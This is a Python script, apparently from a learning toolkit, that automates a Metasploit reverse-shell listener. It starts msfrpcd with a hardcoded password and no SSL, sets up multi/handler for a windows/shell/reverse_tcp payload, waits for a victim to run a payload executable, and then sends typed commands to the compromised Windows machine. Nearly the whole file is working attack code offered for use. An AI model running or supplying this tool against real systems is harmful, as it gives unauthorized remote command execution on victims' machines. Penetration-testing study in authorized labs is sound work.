#Import all required modules.
import os
import socket
import time
from subprocess import check_output
from pymetasploit3.msfrpc import MsfRpcClient

#Function to print introduction of tool to terminal.
def start_note():
    print('\nWelcome to the Msfconsole Listener Tool! The purpose of this tool is to simplify ' +
    '\nthe process of launching a reverse shell connection with a victim machine, allowing the ' +
    '\nuser to execute commands on that machine. This is possible provided an executable ' +
    '\npayload is opened on the victim machine (can be generated using the "Msfvenom Payload' +
    '\nGenerator Tool"), and the attack is successful overall. Happy Hacking!\n' +
    '\n#PLEASE NOTE: This tool in its current functionality will only generate a command ' +
    '\nshell useable with Windows operating systems.\n')

#Function to print final notes about this tool to the terminal.
def end_note():
    print('\nWe hope you have learned a bit about how to create a reverse shell for another' +
    '\nmachine. With this, you may now go and research more about the Msfconsole framework' +
    '\nitself and what its many other uses are. Thank you for using this tool!' +
    '\nPlease visit: https://www.offensive-security.com/metasploit-unleashed/msfconsole/' +
    '\nfor more information regarding Msfconsole.\n')

#Function to print a note to remind the user to run the "UpdateScript.py" script prior to running this tool.
def important_note():
    print('\n#PLEASE ENSURE THE UPDATE SCRIPT HAS BEEN RUN BEFORE USING THIS TOOL FOR THE FIRST TIME#\n')

#Retrieves PID and kills 'msfrpcd' process on Kali.
def kill_PID():
    pid = int(check_output(['pidof', 'msfrpcd']))
    os.system('kill ' + str(pid))

#Function to set IPv4 address of local machine.
def set_IP():
    #Uses google DNS server to check IP.
    try:
        p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        p.connect(('8.8.8.8', 1))
        localhost_IP = p.getsockname()[0]
        p.close()
    except:
        localhost_IP = '#IP UNRETRIEVABLE#' #Try-except block prevents crash if IP cannot be retrieved.

    i = 0
    while(i == 0):
        check_IP = input('Is ' + localhost_IP + ' your IP Address? (y/n): ')

        if(check_IP == 'y'):
            i = 1
            return localhost_IP
        elif(check_IP == 'n'):
            localhost_IP = str(input('Enter Attacker IP Address (IP address of this machine): '))
            i = 1
            return localhost_IP
        else:
            print('Please enter only "y" or "n"')

#Function to set correct port for attack.
def set_port():
    i = 0
    while(i == 0):
        check_port = input('Would you like to use the default port (4444) for connection? (y/n): ')

        if(check_port == 'y'):
            i = 1
            return None
        elif(check_port == 'n'):
            port = str(input('Enter Alternative Port Number: '))
            i = 1
            return port
        else:
            print('Please enter only "y" or "n"')

#Retrieves running session from Msfconsole.
def find_session(sessions_list, exploit_job):
    if not(sessions_list):
        return False
    for i in sessions_list:
        if(sessions_list[i]['exploit_uuid'] == exploit_job['uuid']):
            return i

#Function for communicating with shell. While loop to prompt user to enter commands. Terminates when user types 'exit'.
def command_transmission():
    i = 0
    while(i != 1):
        terminalInput = input('Enter Command (type exit to stop): ')
        if(terminalInput == 'exit'):
            i = 1
        else:
            print(client.sessions.session(sessionActive).run_with_output(cmd=terminalInput, end_strs='\bC:'))

important_note()

#Starts msfrpc process.
msfrpcStart = 'msfrpcd -P password -S'
os.system(msfrpcStart)

time.sleep(5)

start_note()

#Connects to msfrpc service.
client = MsfRpcClient('password', port=55553, ssl=False)

lhost = set_IP()

print('\n#NOTE: Port number must be the same as the port number set when generating ' +
'\nthe payload for the victim machine.\n')
lport = set_port()

#Specifies attack options.
exploit = client.modules.use('exploit', 'multi/handler')
payload = client.modules.use('payload', 'windows/shell/reverse_tcp')
payload['LHOST'] = lhost
payload['LPORT'] = lport

#Runs exploit.
exploitRun = exploit.execute(payload=payload)

print('\n#WAITING FOR PAYLOAD EXECUTABLE TO RUN ON VICTIM#')

#Checks session list is empty before progressing further through source code.
while(len(client.sessions.list) == 0):
    time.sleep(0.1)
print('\n#CONNECTION SUCCESSFUL!#\n' +
'\nIf full command response not received from victim machine, press' +
'\nenter without typing any other commands first to receive the' +
'\nremaining reply from the victim.\n')

#Gets session for the exploit.
sessionActive = find_session(client.sessions.list, exploitRun)

command_transmission()

kill_PID()

print('\n#CONNECTION TERMINATED#')

end_note()


#REFERENCES:

#https://github.com/DanMcInerney/pymetasploit3
    #Repository where 'pymetasploit3.msfrpc' module is imported from.
    #Used as guide for communication with MSFRPC framework.

#https://stackoverflow.com/questions/26688936/how-to-get-pid-by-process-name
    #Used to help define 'kill_PID()' function.

#https://infosecaddicts.com/python-and-metasploit/
    #Used to help define 'find_session()' function.

#https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
    #Used to help define 'set_IP()' function.